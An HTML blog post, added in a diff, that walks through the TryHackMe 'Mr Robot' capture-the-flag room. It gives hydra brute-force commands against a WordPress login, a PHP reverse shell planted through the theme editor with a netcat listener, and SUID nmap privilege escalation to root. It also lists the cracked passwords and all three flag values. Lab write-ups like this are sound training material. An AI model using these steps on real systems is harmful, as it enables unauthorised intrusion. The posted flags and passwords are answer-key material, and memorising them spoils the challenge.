@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Mr Robot CTF</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.3/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="../css/styles.css" rel="stylesheet" />
+
+    </head>
+    <body>
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="index.html">Blog</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">MYWEBSITE</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('../assets/fourth.jpg')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Mr Robot CTF</h1>
+                            <h2 class="subheading">Mr Robot CTF | TryHackMe</h2>
+                            <span class="meta">
+                                Posted by Aravind on 5:00 PM, June 27, 2021
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <p>
+                            <h1>Mr Robot CTF</h1><br>
+                            <b>IP ADDRESS:</b> <i>10.10.27.214</i><br>
+                            <br>
+                            <h2>NMAP</h2>
+                            <ol>
+                                <li>22 - ssh (<i>closed</i>)</li>
+                                <li>80 - http (<i>open</i>)</li>
+                                <li>443 - htps (<i>open</i>)</li>
+                            </ol>
+                        
+                            <h2>WEBSERVER</h2>
+                            <ol style="list-style-type: circle;">
+                                <li>visited <tt>10.10.27.214/robots.txt</tt></li>
+                                <li>found <tt>key-1-of-3.txt</tt> and <tt>fsocity.dic</tt></li>
+                            </ol>
+
+                            <h2>GOBUSTER</h2>
+                            /images               (Status: 301) [Size: 235] [--> http://10.10.27.214/images/]<br>
+                            /blog                 (Status: 301) [Size: 233] [--> http://10.10.27.214/blog/]<br>
+                            /rss                  (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]<br>
+                            /sitemap              (Status: 200) [Size: 0]<br>
+                            /login                (Status: 302) [Size: 0] [--> http://10.10.27.214/wp-login.php]<br>
+                            /0                    (Status: 301) [Size: 0] [--> http://10.10.27.214/0/]<br>
+                            /feed                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]<br>
+                            /video                (Status: 301) [Size: 234] [--> http://10.10.27.214/video/]<br>
+                            /image                (Status: 301) [Size: 0] [--> http://10.10.27.214/image/]<br>
+                            /atom                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/atom/]<br>
+                            /wp-content           (Status: 301) [Size: 239] [--> http://10.10.27.214/wp-content/]<br>
+                            /admin                (Status: 301) [Size: 234] [--> http://10.10.27.214/admin/]<br>
+                            /audio                (Status: 301) [Size: 234] [--> http://10.10.27.214/audio/]<br>
+                            /intro                (Status: 200) [Size: 516314]<br>
+                            /wp-login             (Status: 200) [Size: 2606]<br>
+                            /css                  (Status: 301) [Size: 232] [--> http://10.10.27.214/css/]<br>
+                            /rss2                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]<br>
+                            /license              (Status: 200) [Size: 309]<br>
+                            /wp-includes          (Status: 301) [Size: 240] [--> http://10.10.27.214/wp-includes/]<br>
+                            /js                   (Status: 301) [Size: 231] [--> http://10.10.27.214/js/]<br>
+                            /Image                (Status: 301) [Size: 0] [--> http://10.10.27.214/Image/]<br>
+                            /rdf                  (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/rdf/]<br>
+                            /page1                (Status: 301) [Size: 0] [--> http://10.10.27.214/]<br>
+                            /readme               (Status: 200) [Size: 64]<br>
+                            /robots               (Status: 200) [Size: 41]<br>
+                            <br>
+                            <ol style="list-style-type: circle;">
+                                <li>found wordpress is running</li>
+                                <li>could not enumerate usernames with wordpress scan</li>
+                            </ol>
+                         
+
+                            <h2>HYDRA</h2>
+                            <ol>
+                                <li>used hydra to enumerate usernames</li>
+                                <li><tt>hydra -L fsocity.dic -p test 10.10.27.214 http-post-form "/wp-login.php:log^USER^&pwd=^PWD^:Invalid username" -t 30</tt></li>
+                                <li>Brute forced password</li>
+                                <li><tt>hydra -l Elliot -P pass.txt 10.10.27.214 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"</tt></li>
+                                <li>found password <tt>ER28-0652</tt></li>
+                            </ol>
+
+                            <h2>REVERSE SHELL</h2>
+                            <ol style="list-style-type: circle;">
+                                <li>uploaded a reverse php shell in wordpress dashboard > Appearance > Editor > archive.php</li>
+                                <li>opened a nc listner <tt>nc -lvnp 53</tt></li>
+                                <li>visited <tt>10.10.27.214/wp-content/themes/twentyfifteen/archive.php</tt></li>
+
+                            </ol>
+
+                            <h2>SHELL</h2>
+                             <ol style="list-style-type: circle;">
+                                <li>found password hash of <tt>robot</tt> user and <tt>key-2-of-3.txt</tt> in <tt>daemon</tt> user home directory</li>
+                                <li>used john to crack password and found password <tt>abcdefghijklmnopqrstuvwxyz</tt></li>
+                                <li>upgraded the shell using <tt>python -c "import pty;pty.spawn('/bin/bash')"</tt></li>
+                                <li><tt>su robot</tt> and entered the password</li>
+                                <li>read the <tt>key-2-of-3.txt</tt></li>
+                                <li><tt>find / -perm +6000 2>/dev/null | grep '/bin/</tt></li>
+                                <li>found <tt>usr/local/bin/nmap</tt></li>
+                                <li><tt>/usr/local/bin/nmap --interactive</tt></li>
+                                <li>spawned a shell using <tt>!sh</tt></li>
+                                <li>escalated privilege to root user</li>
+                                <li><tt>cd /root</tt></li>
+                                <li>found <tt>key-3-of-3.txt</tt></li>
+                             </ol>
+
+                            <h2>KEYS (flags)</h2>
+                            <ol>
+                                <li><tt>073403c8a58a1f80d943455fb30724b9</tt></li>
+                                <li><tt>822c73956184f694993bede3eb39f959</tt></li>
+                                <li><tt>04787ddef27c3dee1ee161b21670b4e4</tt></li>
+                            </ol>
+                        </p> 
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <li class="list-inline-item">
+                                <a href="https://twitter.com/greymatt10/">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://www.github.com/greymattt">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
